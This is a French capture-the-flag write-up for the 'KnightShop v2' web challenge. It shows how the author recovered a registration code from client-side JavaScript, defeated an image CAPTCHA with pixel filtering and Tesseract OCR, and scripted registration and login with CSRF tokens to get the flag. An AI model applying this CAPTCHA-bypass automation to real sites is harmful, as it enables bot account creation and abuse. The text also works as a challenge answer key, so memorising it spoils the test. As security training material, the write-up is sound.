# KnightShop v2 — Web

**URL :** `http://95.216.124.220:31064/`  
**Flag :** `CCOI26{f0und_th3_h1dd3n_r3g1str4t10n_c0d3}`

---

## Ce qui change par rapport à v1

Cette fois le formulaire d'inscription est visible (`/register.php` accessible), mais il y a deux nouveaux obstacles :
- Un champ `registration_code` — il faut connaître le code secret
- Un CAPTCHA image à résoudre

---

## Trouver le code d'inscription

Je charge `/js/app.js` et je vois ce code :

```javascript
const key_part_1 = "tghKnAm_I_i";
const key_part_2 = btoa("this_is_not_the_key");  // leurre

function buildRegCode() {
    const indices = [8, 7, 5, 6, 7, 3, 4, 10, 1, 2, 0];
    return indices.map(i => key_part_1[i]).join('');
}
```

Il y a aussi des strings base64 qui décodent en `the_key_is` et `this_is_not_the_key`, clairement des leurres pour perdre du temps.

La vraie logique c'est l'application des indices sur `key_part_1`. Je le fais à la main :

```
key_part_1 = "tghKnAm_I_i"
indices    = [8, 7, 5, 6, 7, 3, 4, 10, 1, 2, 0]

index 8  → 'I'
index 7  → '_'
index 5  → 'A'
index 6  → 'm'
index 7  → '_'
index 3  → 'K'
index 4  → 'n'
index 10 → 'i'
index 1  → 'g'
index 2  → 'h'
index 0  → 't'
```

**Code d'inscription : `I_Am_Knight`**

---

## Bypasser le CAPTCHA

Le CAPTCHA c'est une image PNG 150×50px. Je l'analyse avec PIL et je remarque qu'il n'y a que 3 niveaux de gris :
- `30` → fond noir
- `100` → bruit/parasites
- `200` → texte (gris clair)

Pour extraire le texte proprement, je filtre uniquement les pixels à 200 (le texte) et j'agrandis l'image avant de passer Tesseract dessus. Sans ça, Tesseract se plante sur 3 caractères sur 4.

```python
from PIL import Image
import numpy as np, subprocess, io

def ocr_captcha(s):
    r = s.get(f"{BASE}/captcha.php")
    img = Image.open(io.BytesIO(r.content)).convert('L')
    arr = np.array(img)
    # on garde uniquement les pixels à 200 (texte)
    clean = np.where(arr == 200, 255, 0).astype(np.uint8)
    big = Image.fromarray(clean, 'L').resize((900, 300), Image.NEAREST)
    big.save('/tmp/cap.png')
    res = subprocess.run(
        ['tesseract', '/tmp/cap.png', 'stdout', '--psm', '7',
         '-c', 'tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'],
        capture_output=True, text=True)
    return res.stdout.strip()
```

Le taux de succès de l'OCR est d'environ 40-50%, donc j'enveloppe tout dans une boucle de retry.

---

## Inscription et login

Deux pièges à ne pas rater :
1. Il faut récupérer le CAPTCHA et envoyer le formulaire dans **la même session HTTP** sinon le serveur rejette le code
2. Chaque page (register et login) a son propre **CSRF token** à extraire avant de poster

```python
import requests, re, random, string

BASE = "http://95.216.124.220:31064"

s = requests.Session()
reg = s.get(f"{BASE}/register.php")
csrf = re.search(r'name="csrf_token"\s+value="([^"]+)"', reg.text).group(1)
cap = ocr_captcha(s)  # même session !

user  = 'knight' + ''.join(random.choices(string.digits, k=5))
email = user + '@pwn.io'

r = s.post(f"{BASE}/register.php", data={
    'username': user, 'email': email, 'password': 'Str0ng!Pass',
    'registration_code': 'I_Am_Knight', 'captcha': cap,
    'website': '', 'csrf_token': csrf
}, allow_redirects=True)

if 'captcha' in r.text.lower():
    # OCR raté, recommencer
    pass

# login
lp = s.get(f"{BASE}/login.php")
lcsrf = re.search(r'name="csrf_token"\s+value="([^"]+)"', lp.text).group(1)
s.post(f"{BASE}/login.php", data={
    'email': email, 'password': 'Str0ng!Pass',
    'website': '', 'csrf_token': lcsrf
}, allow_redirects=True)
# → dashboard avec le flag
```

---

## Output

```
$ python3 knightshop2.py
[1] OCR: 'K4mNpQ' → CAPTCHA FAIL
[2] OCR: 'X9vRTL' → OK
FLAG: CCOI26{f0und_th3_h1dd3n_r3g1str4t10n_c0d3}
```

**Flag : `CCOI26{f0und_th3_h1dd3n_r3g1str4t10n_c0d3}`**
